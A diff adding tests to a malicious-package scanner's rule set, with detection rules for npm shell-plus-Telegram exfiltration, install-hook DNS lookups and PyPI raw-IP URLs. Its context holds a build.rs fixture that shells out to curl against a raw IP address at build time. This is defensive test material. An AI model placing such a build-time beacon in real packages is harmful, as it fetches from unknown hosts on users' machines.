@@ -55,6 +55,21 @@ def test_reviewed_rule_lab_signals_are_npm_only():
     assert "BEH_NPM_SMALL_HTTP_SEND" not in package_features.combine(scan, ["http_send", "tiny_package"], "pypi").get("rules_matched", [])
 
 
+def test_rule_lab_298_rules():
+    scan = {"score": 0, "level": "none", "findings": [], "rules_matched": []}
+    def rules(flags, eco):
+        return package_features.combine(scan, flags, eco).get("rules_matched", [])
+    assert "BEH_NPM_SHELL_TELEGRAM" in rules(["child_process", "telegram_bot"], "npm")
+    assert "BEH_NPM_SHELL_TELEGRAM" not in rules(["telegram_bot"], "npm")
+    assert "BEH_NPM_INSTALL_DNS_LOOKUP" in rules(["dns_lookup", "install_hook", "tiny_package"], "npm")
+    assert "BEH_NPM_INSTALL_DNS_LOOKUP" not in rules(["dns_lookup", "install_hook"], "npm")
+    assert "BEH_PYPI_RAW_IP_URL" in rules(["raw_ip_url"], "pypi")
+    assert "BEH_PYPI_RAW_IP_URL" not in rules(["raw_ip_url"], "npm")
+    # Rejected proposals stay out: they fired on cryptography and tqdm.
+    assert not rules(["hex_blob"], "pypi")
+    assert not rules(["telegram_bot"], "pypi")
+
+
 def test_build_rs_beacon_rule():
     flags = package_features.profile([("pkg-1.0.0/build.rs", b'fn main(){ std::process::Command::new("curl").arg("-s").arg("http://1.2.3.4/x").status().unwrap(); }')])
     assert {"build_rs", "build_rs_side_effects", "download_tool", "raw_ip_url"} <= set(flags)
